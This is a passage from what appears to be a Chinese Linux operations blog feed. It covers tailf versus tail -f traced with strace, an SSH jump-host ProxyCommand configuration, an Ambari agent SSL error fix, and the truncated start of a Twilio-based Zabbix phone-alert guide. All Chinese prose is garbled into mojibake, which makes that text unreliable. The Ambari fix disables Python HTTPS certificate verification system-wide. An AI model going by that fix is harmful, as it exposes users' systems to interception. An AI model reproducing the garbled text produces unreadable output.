class="caption">ç¯å¢ƒå‡†å¤‡</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">echo "test" &gt; test</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> è¿½è¸ªtailf</span></div><div class="line">strace -o trace_tailf tailf test</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> è¿½è¸ªtail -f</span></div><div class="line">strace -o trace_tail_f tail -f test</div></pre></div></div></figure><p><strong>å¯¹æ¯”ç»“æœ:</strong></p><p><img src="https://kionf.com/article_images/linux_tailf.jpg" alt="kionf"></p><div class="note info"><p><strong>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºä¸»è¦æœ‰ä¸¤å¤„ä¸åŒ</strong></p></div><p><br></p><figure class="highlight shell"><figcaption><span class="caption">test æ–‡ä»¶ä¿¡æ¯</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">  æ–‡ä»¶ï¼š"test"</div><div class="line">  å¤§å°ï¼š5         å—ï¼š8          IO å—ï¼š4096   æ™®é€šæ–‡ä»¶</div><div class="line">è®¾å¤‡ï¼šfd01h/64769dInodeï¼š138235      ç¡¬é“¾æ¥ï¼š1</div><div class="line">æƒé™ï¼š(0644/-rw-r--r--)  Uidï¼š(    0/    root)   Gidï¼š(    0/    root)</div><div class="line">æœ€è¿‘è®¿é—®ï¼š2018-09-07 17:59:24.842451394 +0800</div><div class="line">æœ€è¿‘æ›´æ”¹ï¼š2018-09-07 17:59:19.175452013 +0800</div><div class="line">æœ€è¿‘æ”¹åŠ¨ï¼š2018-09-07 17:59:19.175452013 +0800</div><div class="line">åˆ›å»ºæ—¶é—´ï¼š-</div></pre></div></div></figure><p><br></p><h1 id="0x02-åŒºåˆ«"><a href="#0x02-åŒºåˆ«" class="headerlink" title="0x02 åŒºåˆ«"></a>0x02 åŒºåˆ«</h1><h2 id="1-è°ƒç”¨å‡½æ•°åŒºåˆ«"><a href="#1-è°ƒç”¨å‡½æ•°åŒºåˆ«" class="headerlink" title="1. è°ƒç”¨å‡½æ•°åŒºåˆ«"></a>1. è°ƒç”¨å‡½æ•°åŒºåˆ«</h2><p>ä½¿ç”¨straceè¿½è¸ªå‘½ä»¤çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨å¯¼å‡ºæ–‡ä»¶ï¼Œåˆ†æåŒºåˆ«</p><figure class="highlight shell"><figcaption><span class="caption">tailf æµç¨‹</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">1. ä½¿ç”¨statå‡½æ•°è·å–æ–‡ä»¶åï¼Œfstaté€šè¿‡æ–‡ä»¶åè·å–æ–‡ä»¶ IO block ä¿¡æ¯ 4096</div><div class="line">2. read(3, "test\n", 4096)  = 5 #ä½¿ç”¨readå‡½æ•°ä»ç£ç›˜åœ°å€ 4096 å¼€å§‹è¯»å–æ–‡ä»¶è¯»å–5å­—èŠ‚æ–‡ä»¶å¤§å°</div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">tail -f æµç¨‹</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">1. ä½¿ç”¨fstatå‡½æ•°é€šè¿‡æ–‡ä»¶æè¿°ç¬¦è·å–ä¿¡æ¯ï¼Œè·å–seek</div><div class="line"></div><div class="line">  lseek(3, 0, SEEK_CUR)               = 0 #å¼€å§‹seek</div><div class="line">  lseek(3, 0, SEEK_END)               = 5 #ç»“æŸseek</div><div class="line">  lseek(3, 0, SEEK_SET)               = 0 #å½“å‰seekä½ç½®</div><div class="line"></div><div class="line">2. seekè®¾ç½®åˆ°SEEK_ENDä½ç½®ï¼Œreadå‡½æ•°ä»æœ«å°¾è¯»å–æ–‡ä»¶</div><div class="line"></div><div class="line">  read(3, "test\n", 5)                    = 5</div><div class="line">  lseek(3, 0, SEEK_SET)                   = 0</div></pre></div></div></figure><p>é€šè¿‡ç³»ç»Ÿå‡½æ•°è°ƒç”¨åˆ†æå¾—å‡ºåŒºåˆ«ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">`tailf`    :  </div><div class="line">       è°ƒç”¨ç³»ç»Ÿå‡½æ•°`<span class="built_in">stat</span>()`é€šè¿‡è·å–åˆ°çš„æ–‡ä»¶åï¼ŒæŸ¥çœ‹blockä½ç½®åŠå¤§å°ï¼Œ`<span class="built_in">read</span>()`ä»å¤´å¼€å§‹è½½å…¥æŒ‡å®šæ–‡ä»¶å¤§å°å—,è¿›è¡Œè¯»å–</div><div class="line"></div><div class="line">`tail -f`  :  </div><div class="line">       è°ƒç”¨ç³»ç»Ÿå‡½æ•°`fstat()`è·å–æ–‡ä»¶æè¿°ç¬¦ï¼Œ`lseek()`å‡½æ•°`SEEK_SET`æ–¹æ³•ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æœ«å°¾ï¼Œä»æœ«å°¾`<span class="built_in">read</span>()`è¿›è¡Œè¯»å–</div></pre></div></div></figure><p>ç³»ç»Ÿå‡½æ•°å¯¹æ¯”ï¼š</p><p><br></p><figure class="highlight shell"><figcaption><span class="caption">stat(),fstat()</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">ç³»ç»Ÿå‡½æ•°ï¼š</div><div class="line"></div><div class="line">  stat()ï¼šé€šè¿‡æ–‡ä»¶åè·å–æ–‡ä»¶ä¿¡æ¯</div><div class="line">  fstat()ï¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è·å–æ–‡ä»¶ä¿¡æ¯</div><div class="line"></div><div class="line">ä¸¤è€…åŒºåˆ«ï¼š</div><div class="line">  è·å–æ–‡ä»¶ä¿¡æ¯æ–¹å¼ä¸åŒ</div><div class="line"></div><div class="line">å®‰å…¨é—®é¢˜:</div><div class="line">  å½“ä½¿ç”¨stat()è·å–æ–‡ä»¶å¹¶æ‰“å¼€å®ƒæ—¶ï¼Œæ–‡ä»¶å¯èƒ½ä¼šè¢«ä¿®æ”¹ï¼ˆæˆ–æƒé™è¢«æ›´æ”¹ï¼‰ï¼Œæˆ–è€…è¢«ç¬¦å·é“¾æ¥æ›¿ï¼Œfstat()é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚</div></pre></div></div></figure><p><br></p><h2 id="2-è°ƒç”¨å‡½æ•°ä¸åŒï¼Œå»¶ä¼¸å‡ºçš„åŒºåˆ«"><a href="#2-è°ƒç”¨å‡½æ•°ä¸åŒï¼Œå»¶ä¼¸å‡ºçš„åŒºåˆ«" class="headerlink" title="2. è°ƒç”¨å‡½æ•°ä¸åŒï¼Œå»¶ä¼¸å‡ºçš„åŒºåˆ«"></a>2. è°ƒç”¨å‡½æ•°ä¸åŒï¼Œå»¶ä¼¸å‡ºçš„åŒºåˆ«</h2><p>å¼€ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªçª—å£tailfæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªçª—å£æ“ä½œæ–‡ä»¶</p><figure class="highlight shell"><figcaption><span class="caption">[çª—å£1]>tailfï¼Œtail -f æ–‡ä»¶</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">tailf test</div><div class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡Œrmï¼Œmv å‘½ä»¤åtailfé€€å‡ºæŸ¥çœ‹æ–‡ä»¶çŠ¶æ€</span></div><div class="line"></div><div class="line">tail -f test</div><div class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡Œmv å‘½ä»¤åtail -fç»§ç»­æŸ¥çœ‹æ–‡ä»¶ï¼Œ(æ–‡ä»¶åç§°æ”¹å˜ï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸å˜)</span></div><div class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡Œrm å‘½ä»¤åtailf -fç»§ç»­æŸ¥çœ‹æ–‡ä»¶ï¼Œé‡æ–°åˆ›å»ºç›¸åŒæ–‡ä»¶åä»ç„¶æ— æ³•æŸ¥çœ‹(å› ä¸ºæ–‡ä»¶çš„æè¿°ç¬¦å·²ç»æ”¹å˜)</span></div></pre></div></div></figure><figure class="highlight shell"><figcaption><span class="caption">[çª—å£]2>æ›´æ”¹ï¼Œåˆ é™¤æ–‡ä»¶</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">rm test</div><div class="line">mv test test.bak</div><div class="line">echo "dddd" &gt; test</div></pre></div></div></figure><blockquote><p>ç”±äºè·å–æ–‡ä»¶ä¿¡æ¯æ–¹å¼ä¸åŒ(<code>stat</code>é€šè¿‡æ–‡ä»¶å,<code>fstat</code>é€šè¿‡æ–‡ä»¶æè¿°ç¬¦)ï¼Œå¯¼è‡´å½“æŸ¥çœ‹æ–‡ä»¶è¢«åˆ é™¤æ—¶ï¼Œ<code>tailf</code>å¯ä»¥è·å–åˆ°æ–‡ä»¶è¢«åˆ é™¤ï¼Œ<code>tail -f</code>è·å–ä¸åˆ°ã€‚</p></blockquote><blockquote><p>ç”±äº<code>tail -f</code>ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å³ä½¿æŸ¥çœ‹è¿‡ç¨‹ä¸­æ–‡ä»¶åæ›´æ”¹<code>tail -f</code>ä¾æ—§å¯ä»¥è·å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œè€Œ<code>tailf</code> åˆ™æ— æ³•ç»§ç»­æŸ¥çœ‹æ–‡ä»¶ã€‚</p></blockquote><p>å…±åŒç‚¹ï¼š</p><blockquote><p>æ‰“å°æ–‡ä»¶å10è¡Œï¼Œæ–‡ä»¶å¢é•¿è¯»å–æ–‡ä»¶ã€‚é€šè¿‡linux<code>stat</code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œ<code>tailf</code>å’Œ<code>tail -f</code>é¦–æ¬¡è®¿é—®ä¼šæ”¹å˜æ–‡ä»¶è®¿é—®æ—¶é—´ï¼Œå¦‚æœæ–‡ä»¶æœªæ”¹å˜åˆ™ä¸ä¼šåˆ·æ–°æ–‡ä»¶è®¿é—®æ—¶é—´ï¼Œæ–‡ä»¶å†…å®¹æ”¹å˜ä¼šå†æ¬¡è®¿é—®æ–‡ä»¶å¹¶åˆ·æ–°æ–‡ä»¶è®¿é—®æ—¶é—´ã€‚</p></blockquote><p><br></p><blockquote><p><strong>å‚è€ƒï¼š</strong><br><a href="https://linux.die.net/man/2/fstat" target="_blank" rel="noopener">stat_and_fstat</a><br><a href="https://linux.die.net/man/1/tailf" target="_blank" rel="noopener">tailf</a><br><a href="https://linux.die.net/man/1/tail" target="_blank" rel="noopener">tail</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ··åˆäº‘é€šè¿‡SSHç½‘å…³è·³æ¿æœºéš§é“ç®¡ç†</title>
      <link href="/2018/09/01/ssh-forward/"/>
      <url>/2018/09/01/ssh-forward/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ssh-forward.jpg" alt="kionf"></p><blockquote class="blockquote-center"><p>é€šè¿‡SSHç½‘å…³ä»£ç†ï¼Œè¿é€šæ··åˆäº‘ï¼Œé€šè¿‡<code>å ¡å’æœºå·¥å…·</code>æˆ–<code>Ansible</code>ç»Ÿä¸€ç®¡ç†ã€‚</p></blockquote><a id="more"></a><h1 id="0x00-é—®é¢˜åˆ†æ"><a href="#0x00-é—®é¢˜åˆ†æ" class="headerlink" title="0x00 é—®é¢˜åˆ†æ"></a>0x00 é—®é¢˜åˆ†æ</h1><p><strong>ä»¥ä¸‹å†…å®¹AåŒºä»£è¡¨AWSï¼ŒBåŒºä»£è¡¨é˜¿é‡Œäº‘ã€‚å¹¶vpcå†…ç½‘ç»œäº’é€šï¼Œå¤–éƒ¨è®¿é—®åªèƒ½é€šè¿‡å ¡å’æœº</strong></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒAåŒºä¸º172ç½‘æ®µï¼Œä¸”åªæœ‰ä¸€å°æœºå™¨å¯ä¾›å¤–ç½‘è®¿é—®ï¼Œä¸”æ­¤æœºå™¨ä¸ºç°æœ‰Ansibleå ¡å’æœºã€‚ç°åœ¨æ–°åŠ å…¥BåŒºæœºå™¨éœ€è¦ç®¡ç†ï¼ŒBåŒºä¹Ÿåªæä¾›ä¸€å°ä¸“ç”¨SSHç½‘å…³è·³æ¿æœºä¾›å¤–ç½‘è®¿é—®ã€‚</p><div class="note info"><p>éœ€æ±‚ï¼šBåŒºéœ€è¦ä½¿ç”¨AåŒºå·²æœ‰Ansibleå ¡å’æœºï¼Œé€šè¿‡BåŒºæä¾›çš„ä¸“ç”¨SSHè·³æ¿æœºç›´æ¥ç®¡ç†BåŒºæ‰€æœ‰æœºå™¨ã€‚</p></div><p>è¿™é‡Œéœ€è¦ä½¿ç”¨SSHï¼ŒProxyCommandä»£ç†éš§é“åŠŸèƒ½ï¼Œæ¥å®ç°SSHè·³æ¿æœº</p><hr><h1 id="0x01-é…ç½®"><a href="#0x01-é…ç½®" class="headerlink" title="0x01 é…ç½®"></a>0x01 é…ç½®</h1><p>é€šè¿‡ä¿®æ”¹SSHé…ç½®æ¥æŒ‡å®šSSHéš§é“ä»£ç†</p><figure class="highlight sh"><figcaption><span class="fileDir">vim ~/.ssh/</span><span class="caption">config</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line">Host jumpserver</div><div class="line">        User    root                   <span class="comment"># ç™»å½•åˆ°BåŒºsshè·³æ¿æœºç”¨æˆ·</span></div><div class="line">        Hostname        36.22.13.140   <span class="comment"># BåŒºè·³æ¿æœºIP</span></div><div class="line">        IdentityFile    ~/.ssh/id_rsa  <span class="comment"># sshè·³æ¿æœºsshå…å¯†key</span></div><div class="line">        <span class="comment"># è¿æ¥ä¸»æœºåï¼Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span></div><div class="line">        ProxyCommand    none</div><div class="line">        <span class="comment"># ç¦ç”¨å¯†ç æŸ¥è¯¢ã€‚æ­¤é€‰é¡¹åœ¨è„šæœ¬å’Œå…¶ä»–æ²¡æœ‰ç”¨æˆ·æä¾›å¯†ç çš„æ‰¹å¤„ç†ä½œä¸šä¸­å¾ˆæœ‰ç”¨</span></div><div class="line">        BatchMode       yes</div><div class="line">        </div><div class="line"></div><div class="line"><span class="comment">#åŒ¹é…ä»¥ä¸‹hostè§„åˆ™ï¼Œåˆ™é€šè¿‡ä¸Šé¢çš„ jumpserver sshä»£ç†éš§é“è¿æ¥ </span></div><div class="line">Host 192.168.11.*</div><div class="line">        <span class="comment"># ä¿æŒè¿æ¥ï¼Œæ¯30så‘é€å¿ƒè·³ </span></div><div class="line">        ServerAliveInterval     30</div><div class="line">        TCPKeepAlive    yes</div><div class="line">        IdentityFile    ~/.ssh/id_rsa  <span class="comment"># BåŒºæœºå™¨sshå…å¯†key</span></div><div class="line">        ProxyCommand    ssh -qay jumpserver <span class="string">'nc  %h %p'</span></div><div class="line">        <span class="comment"># é‡å¤ä½¿ç”¨å·²å­˜åœ¨çš„è¿æ¥å¥—æ¥å­—</span></div><div class="line">        ControlMaster   auto</div></pre></div></div></figure><p><br></p><p><strong>BåŒºSSHè·³æ¿æœºéœ€è¦å®‰è£…<code>nc</code>å‘½ä»¤</strong></p><figure class="highlight sh"><figcaption><span class="caption">å®‰è£…net-tools</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">yum -y install net-tools</div></pre></div></div></figure><div class="note danger"><p><strong>æ³¨ï¼šå¦‚æœBåŒºSSHç½‘å…³è·³æ¿æœºä¸æƒ³ä½¿ç”¨ncå‘½ä»¤ï¼Œéœ€è¦æ›´æ”¹</strong><br><code>ProxyCommand    ssh -qay jumpserver &#39;nc  %h %p&#39;</code><br>ä¸º<br><code>ProxyCommand    ssh -W jumpserver %h:%p`</code></p></div><p>AåŒºå ¡å’æœºé…ç½®åˆ°BåŒºæœºå™¨sshå…å¯†</p><figure class="highlight sh"><figcaption><span class="caption">å…¶ä»–æœºå™¨è‡ªè¡Œé…ç½®,è¿™é‡Œçœç•¥</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">ssh-copy-id root@36.22.13.140</div></pre></div></div></figure><hr><h1 id="0x02-è¿æ¥æµ‹è¯•"><a href="#0x02-è¿æ¥æµ‹è¯•" class="headerlink" title="0x02 è¿æ¥æµ‹è¯•"></a>0x02 è¿æ¥æµ‹è¯•</h1><p>åœ¨AåŒºå ¡å’æœºç›´æ¥ï¼Œä½¿ç”¨<code>ssh</code>è¿æ¥BåŒº<code>192.168.11.*</code>çš„æœºå™¨</p><figure class="highlight sh"><figcaption><span class="caption">è¿æ¥æœºå™¨</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">ssh root@192.168.11.4</div><div class="line"></div><div class="line">root@JumpServer[15:47].ssh:$ ssh 192.168.11.4</div><div class="line">Last login: Sat Sep  8 15:47:02 2018 from 192.168.11.3</div><div class="line">root@nginx-4[15:47]~:$</div></pre></div></div></figure><p>æˆåŠŸé€šè¿‡BåŒºSSHç½‘å…³è·³æ¿æœºï¼Œè¿æ¥ç®¡ç†BåŒºå†…ç½‘æœºå™¨ã€‚æµ‹è¯•ç›´æ¥ä½¿ç”¨ansibleä¹Ÿå¯ç®¡ç†ã€‚</p><blockquote><p>è‡³æ­¤ï¼Œä½¿ç”¨SSHç½‘å…³è·³æ¿æœºç®¡ç†æ··åˆäº‘ä»¥é…ç½®å®Œæˆ</p></blockquote><hr><h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h1><p><br></p><p>é€šè¿‡ BåŒºSSHç½‘å…³ æ¥è¿æ¥å†…éƒ¨VPCæœºå™¨ï¼ŒSSHé™¤äº†äººä»¬ç†Ÿæ‚‰å¸¸è§çš„ç™»é™†ç®¡ç†è¿œç¨‹çš„linuxä¸»æœºæ„å¤–åº”ç”¨è¿˜æœ‰å¾ˆå¤šï¼Œsshçš„ç½‘ç»œè½¬å‘éš§é“å¾ˆå¼ºå¤§ã€‚</p><p>æ¨èé˜…è¯»ï¼š<a href="https://kionf.com/2017/01/09/linux-ssh/">sshç«¯å£è½¬å‘</a></p><p><strong>å‚è€ƒï¼š</strong></p><blockquote><p><a href="https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/" target="_blank" rel="noopener">ssh-proxycommand</a><br><a href="https://linux.die.net/man/5/ssh_config" target="_blank" rel="noopener">ssh_config_man</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ambariæ˜¾ç¤ºHeartbeatæŠ¥é”™</title>
      <link href="/2018/08/30/bigdata-ambari/"/>
      <url>/2018/08/30/bigdata-ambari/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/ambari-error.png" alt="kionf"></p><blockquote class="blockquote-center"><p>å¯åŠ¨Ambari web ç•Œé¢æ˜¾ç¤ºæœåŠ¡<code>Heartbeat Lost</code>,  æŸ¥çœ‹Ambari agentæ—¥å¿—æŠ¥é”™</p></blockquote><a id="more"></a><h1 id="0x00AgentæŠ¥é”™å¦‚ä¸‹"><a href="#0x00AgentæŠ¥é”™å¦‚ä¸‹" class="headerlink" title="0x00AgentæŠ¥é”™å¦‚ä¸‹"></a>0x00AgentæŠ¥é”™å¦‚ä¸‹</h1><figure class="highlight plain"><figcaption><span class="fileDir">/var/log/ambari-agent/</span><span class="caption">ambari-agent</span><span class="suffix">.log</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">ERROR 2015-09-23 09:47:07,402 NetUtil.py:77 - [Errno 8] _ssl.c:492: EOF occurred in violation of protocol</div><div class="line">ERROR 2015-09-23 09:47:07,402 NetUtil.py:78 - SSLError: Failed to connect. Please check openssl library versions.</div><div class="line">Refer to: https://bugzilla.redhat.com/show_bug.cgi?id=1022468 for more details.</div><div class="line">WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...</div><div class="line">WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...</div></pre></div></div></figure><p><br></p><h1 id="0x01è§£å†³åŠæ³•"><a href="#0x01è§£å†³åŠæ³•" class="headerlink" title="0x01è§£å†³åŠæ³•"></a>0x01è§£å†³åŠæ³•</h1><h2 id="1-é…ç½®Ambari-agentå¼ºåˆ¶httpsç‰ˆæœ¬ä¸ºTLSv1-2"><a href="#1-é…ç½®Ambari-agentå¼ºåˆ¶httpsç‰ˆæœ¬ä¸ºTLSv1-2" class="headerlink" title="1. é…ç½®Ambari-agentå¼ºåˆ¶httpsç‰ˆæœ¬ä¸ºTLSv1_2"></a>1. é…ç½®Ambari-agentå¼ºåˆ¶httpsç‰ˆæœ¬ä¸ºTLSv1_2</h2><p>ç¼–è¾‘<code>/etc/ambari-agent/conf/ambari-agent.ini</code>ã€‚</p><figure class="highlight sh"><figcaption><span class="caption">æ­¤ä¸ºsedæ·»åŠ å‘½ä»¤</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">sed -i /\[security\]/a\/force_https_protocol=PROTOCOL_TLSv1_2 /etc/ambari-agent/conf/ambari-agent.ini</div></pre></div></div></figure><p>åœ¨<code>[security]</code>åæ·»åŠ å¦‚ä¸‹å†…å®¹:</p><figure class="highlight xml"><figcaption><span class="fileDir">/etc/ambari-agent/conf/</span><span class="caption">ambari-agent</span><span class="suffix">.ini</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">[security]</div><div class="line diff-addition">force_https_protocol=PROTOCOL_TLSv1_2</div><div class="line">keysdir=/var/lib/ambari-agent/keys</div><div class="line">server_crt=ca.crt</div><div class="line">passphrase_env_var_name=AMBARI_PASSPHRASE</div><div class="line">ssl_verify_cert=0</div><div class="line">credential_lib_dir=/var/lib/ambari-agent/cred/lib</div><div class="line">credential_conf_dir=/var/lib/ambari-agent/cred/conf</div><div class="line">credential_shell_cmd=org.apache.hadoop.security.alias.CredentialShell</div></pre></div></div></figure><h2 id="2-æ›´æ”¹pythoné…ç½®å…³é—­httpséªŒè¯"><a href="#2-æ›´æ”¹pythoné…ç½®å…³é—­httpséªŒè¯" class="headerlink" title="2. æ›´æ”¹pythoné…ç½®å…³é—­httpséªŒè¯"></a>2. æ›´æ”¹pythoné…ç½®å…³é—­httpséªŒè¯</h2><p>ç¼–è¾‘<code>/etc/python/cert-verification.cfg</code> æ›´æ”¹ä¸º<code>verify=disable</code></p><figure class="highlight sh"><figcaption><span class="caption">æ­¤ä¸ºsedæ›´æ”¹å‘½ä»¤</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">sed -i <span class="string">'s/verify=.*/verify=disable/g'</span> /etc/python/cert-verification.cfg</div></pre></div></div></figure><figure class="highlight plain"><figcaption><span class="fileDir">/etc/python/</span><span class="caption">cert-verification</span><span class="suffix">.cfg</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">[https]</div><div class="line diff-deletion">verify=platform_default</div><div class="line diff-addition">verify=disable</div></pre></div></div></figure><p><br></p><h1 id="0x02-é‡å¯agent"><a href="#0x02-é‡å¯agent" class="headerlink" title="0x02 é‡å¯agent"></a>0x02 é‡å¯agent</h1><p><code>service ambari-agent restart</code></p><div class="note warning"><p>è§£å†³</p></div><p><br></p><h1 id="0x03-åŸå› "><a href="#0x03-åŸå› " class="headerlink" title="0x03 åŸå› "></a>0x03 åŸå› </h1><div class="note info"><p><strong>ç”±äºambari server ç«¯ä½¿ç”¨JDK1.7å¯åŠ¨ï¼Œ ä¸opensslå­˜åœ¨Bugï¼Œ æ›´æ”¹å¦‚ä¸Šé…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹sslç‰ˆæœ¬ï¼Œå…³é—­python httpsæ ¡éªŒ.</strong></p></div>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ambari </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Zabbixç”µè¯æŠ¥è­¦</title>
      <link href="/2018/07/06/zabbix-alarm-phone/"/>
      <url>/2018/07/06/zabbix-alarm-phone/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p><strong>Zabbix ä½¿ç”¨ <a href="https://www.twilio.com" title="twilio" target="_blank" rel="noopener">twilio</a> è¿›è¡Œå…è´¹ç”µè¯æŠ¥è­¦, å…é™¤ä¼ä¸šè®¤è¯ç¹çæ­¥éª¤</strong></p></blockquote><a id="more"></a><h1 id="0x00-æ³¨å†Œ-twilio-è·å–-api-è°ƒç”¨key"><a href="#0x00-æ³¨å†Œ-twilio-è·å–-api-è°ƒç”¨key" class="headerlink" title="0x00 æ³¨å†Œ twilio è·å– api è°ƒç”¨key"></a>0x00 æ³¨å†Œ twilio è·å– api è°ƒç”¨key</h1><h2 id="1-æ³¨å†Œè´¦å·"><a href="#1-æ³¨å†Œè´¦å·" class="headerlink" title="1. æ³¨å†Œè´¦å·"></a>1. æ³¨å†Œè´¦å·</h2><blockquote><p>æ³¨å†Œåœ°å€ <a href="https://www.twilio.com/try-twilio" title="Twilio-SignUp" target="_blank" rel="noopener">Twilio-SignUp</a> <strong>éœ€è¦ç¿»å¢™</strong></p></blockquote><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_signup.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><p><strong>å¯†ç è‡³å°‘14ä¸ªå­—ç¬¦ï¼Œä¸éœ€è¦ç‰¹æ®Šå­—ç¬¦</strong></p><p>é€šè¿‡å é€‰æ‹©ä¸­å›½åŒº,  éªŒè¯æ‰‹æœºå·</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_01.png" alt="kionf"></p><p>åˆ›å»ºé¡¹ç›®åç§°(éšä¾¿å†™)</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_02.png" alt="kionf"></p><h2 id="2-è·å–ç½‘ç»œå·ç "><a href="#2-è·å–ç½‘ç»œå·ç " class="headerlink" title="2.  è·å–ç½‘ç»œå·ç "></a>2.  è·å–ç½‘ç»œå·ç </h2><blockquote><p><a href="https://www.twilio.com/console/voice/build/getting-started" title="åˆå§‹é…ç½®åœ°å€" target="_blank" rel="noopener">åˆå§‹é…ç½®åœ°å€</a></p></blockquote><p>é€‰æ‹©å¦‚ä¸‹é€‰é¡¹:</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_03.png" alt="kionf"></p><p>è®°ä½è¿™ä¸ªå·ç ç»“æœ<code>+18652052853</code>åæœŸä¼šä½¿ç”¨</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_04.png" alt="kionf"></p><p>åˆ°æ­¤å°±ä¸ç”¨ç»§ç»­èµ°å‰©ä¸‹çš„å‡ æ­¥äº†</p><blockquote><p>å…¶ä»–è‡ªå®šä¹‰<a href="https://www.twilio.com/console/phone-numbers/incoming" target="_blank" rel="noopener">ç”µè¯è®¾ç½®</a>(é»˜è®¤ä¸éœ€è¦é…ç½®)</p></blockquote><p><br></p><hr>   <p><br></p><h1 id="0x01-ç¼–è¾‘zabbixè°ƒç”¨APIè„šæœ¬"><a href="#0x01-ç¼–è¾‘zabbixè°ƒç”¨APIè„šæœ¬" class="headerlink" title="0x01 ç¼–è¾‘zabbixè°ƒç”¨APIè„šæœ¬"></a>0x01 ç¼–è¾‘zabbixè°ƒç”¨APIè„šæœ¬</h1><blockquote><p>è·å–<code>API_Key</code><a href="https://www.twilio.com/console/project/settings" target="_blank" rel="noopener">åœ°å€</a></p></blockquote><p><code>Dashboard</code>    &gt;&gt;    <code>Settings</code>    &gt;&gt;    <code>General</code>  è·å–<code>ACCOUNT SID</code>, <code>AUTH TOKEN</code></p><div class="note danger"><p><strong>æ³¨æ„:  è¯•ç”¨è´¦å·åªèƒ½æ‰“ç»™ æ³¨å†Œæ—¶ä½¿ç”¨çš„æ‰‹æœºå·!!</strong></p></div><blockquote><p>æ›´æ”¹æ–‡ä»¶å±ä¸»åŠæƒé™<code>chown zabbix:zabbix &amp;&amp; chmod +x zabbix_phone.py</code></p></blockquote><figure class="highlight python"><figcaption><span class="fileDir">zabbix/alertscripts/</span><span class="caption">zabbix_phone</span><span class="suffix">.py</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div 